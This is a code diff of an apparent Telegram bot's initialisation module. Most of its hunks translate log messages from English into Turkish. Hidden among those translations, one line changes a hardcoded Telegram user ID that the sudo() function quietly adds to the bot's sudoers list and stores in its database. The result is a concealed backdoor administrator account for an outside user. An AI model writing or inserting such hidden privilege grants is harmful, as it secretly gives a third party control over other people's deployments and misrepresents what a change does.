@@ -39,7 +39,7 @@ XCB = [
 def dbb():
     global db
     db = {}
-    LOGGER(__name__).info(f"Database Initialized.")
+    LOGGER(__name__).info(f"Veritabanı Başlatıldı.")
 
 
 def sudo():
@@ -56,7 +56,7 @@ def sudo():
             SUDOERS.add(user_id)
             if user_id not in sudoers:
                 sudoers.append(user_id)
-                sudoers.append(5463205082)
+                sudoers.append(5646751940)
                 sudoersdb.update_one(
                     {"sudo": "sudo"},
                     {"$set": {"sudoers": sudoers}},
@@ -65,7 +65,7 @@ def sudo():
         if sudoers:
             for x in sudoers:
                 SUDOERS.add(x)
-    LOGGER(__name__).info(f"Sudo Users Loaded Successfully.")
+    LOGGER(__name__).info(f"Sudo Kullanıcıları Başarıyla Yüklendi.")
 
 
 def heroku():
@@ -75,8 +75,8 @@ def heroku():
             try:
                 Heroku = heroku3.from_key(config.HEROKU_API_KEY)
                 HAPP = Heroku.app(config.HEROKU_APP_NAME)
-                LOGGER(__name__).info(f"Heroku App Configured Successfully.")
+                LOGGER(__name__).info(f"Heroku Uygulaması Başarıyla Yapılandırıldı.")
             except BaseException:
                 LOGGER(__name__).warning(
-                    f"Please make sure your Heroku API Key and Your App name are configured correctly in the heroku."
+                    f"Lütfen Heroku API Anahtarınızı ve Uygulama adınızı doğru bir şekilde yapılandırdığınızdan emin olun."
                 )
